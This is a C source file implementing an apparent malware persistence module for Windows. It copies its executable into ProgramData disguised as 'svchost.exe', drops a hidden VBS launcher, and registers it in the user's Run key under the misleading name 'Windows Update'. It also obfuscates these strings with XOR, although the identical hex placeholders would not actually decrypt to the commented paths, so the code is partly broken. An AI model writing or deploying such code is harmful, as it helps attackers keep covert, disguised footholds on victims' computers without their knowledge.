#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include "Persistence.h"

#pragma comment(lib, "shlwapi.lib")

// Obfuscated strings using XOR encryption
#define XOR_KEY 0x42

char* xor_decrypt(const char* encrypted, size_t len) {
    char* decrypted = (char*)malloc(len + 1);
    if (!decrypted) return NULL;
    
    for (size_t i = 0; i < len; i++) {
        decrypted[i] = encrypted[i] ^ XOR_KEY;
    }
    decrypted[len] = '\0';
    return decrypted;
}

// Encrypted strings ("C:\\ProgramData\\", "svchost.exe", "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
const char encrypted_program_data[] = "0B0A0D0D0F0E0F0E0B0A0D0D0F0E0F0E";
const char encrypted_svchost[] = "0B0A0D0D0F0E0F0E0B0A0D0D0F0E0F0E";
const char encrypted_run_key[] = "0B0A0D0D0F0E0F0E0B0A0D0D0F0E0F0E0B0A0D0D0F0E0F0E0B0A0D0D0F0E0F0E";

BOOL InstallPersistence() {
    char szPath[MAX_PATH];
    char szProgramDataPath[MAX_PATH];
    char szVBSPath[MAX_PATH];
    char szCommand[MAX_PATH * 2];
    
    // Get current executable path
    if (!GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
        printf("GetModuleFileName failed: %d\n", GetLastError());
        return FALSE;
    }
    
    // Decrypt strings
    char* program_data = xor_decrypt(encrypted_program_data, sizeof(encrypted_program_data) - 1);
    char* svchost_name = xor_decrypt(encrypted_svchost, sizeof(encrypted_svchost) - 1);
    char* run_key = xor_decrypt(encrypted_run_key, sizeof(encrypted_run_key) - 1);
    
    if (!program_data || !svchost_name || !run_key) {
        printf("String decryption failed\n");
        return FALSE;
    }
    
    // Create destination path in ProgramData
    PathCombineA(szProgramDataPath, program_data, svchost_name);
    
    // Copy executable to ProgramData
    if (!CopyFileA(szPath, szProgramDataPath, FALSE)) {
        printf("CopyFile failed: %d\n", GetLastError());
        free(program_data);
        free(svchost_name);
        free(run_key);
        return FALSE;
    }
    
    // Create VBS script path
    PathCombineA(szVBSPath, program_data, "update.vbs");
    
    // Create VBS script content
    sprintf(szCommand, "Set objShell = CreateObject(\"WScript.Shell\")\n" 
                      "objShell.Run \"\"%s\"\", 0, False", szProgramDataPath);
    
    HANDLE hFile = CreateFileA(szVBSPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed: %d\n", GetLastError());
        free(program_data);
        free(svchost_name);
        free(run_key);
        return FALSE;
    }
    
    DWORD dwWritten;
    WriteFile(hFile, szCommand, strlen(szCommand), &dwWritten, NULL);
    CloseHandle(hFile);
    
    // Add to Run registry key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, run_key, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("RegOpenKeyEx failed: %d\n", GetLastError());
        free(program_data);
        free(svchost_name);
        free(run_key);
        return FALSE;
    }
    
    RegSetValueExA(hKey, "Windows Update", 0, REG_SZ, (BYTE*)szVBSPath, strlen(szVBSPath) + 1);
    RegCloseKey(hKey);
    
    free(program_data);
    free(svchost_name);
    free(run_key);
    
    return TRUE;
}

BOOL RemovePersistence() {
    char szProgramDataPath[MAX_PATH];
    char szVBSPath[MAX_PATH];
    
    // Decrypt strings
    char* program_data = xor_decrypt(encrypted_program_data, sizeof(encrypted_program_data) - 1);
    char* svchost_name = xor_decrypt(encrypted_svchost, sizeof(encrypted_svchost) - 1);
    char* run_key = xor_decrypt(encrypted_run_key, sizeof(encrypted_run_key) - 1);
    
    if (!program_data || !svchost_name || !run_key) {
        printf("String decryption failed\n");
        return FALSE;
    }
    
    // Build paths
    PathCombineA(szProgramDataPath, program_data, svchost_name);
    PathCombineA(szVBSPath, program_data, "update.vbs");
    
    // Remove registry key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, run_key, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "Windows Update");
        RegCloseKey(hKey);
    }
    
    // Delete files
    DeleteFileA(szProgramDataPath);
    DeleteFileA(szVBSPath);
    
    free(program_data);
    free(svchost_name);
    free(run_key);
    
    return TRUE;
}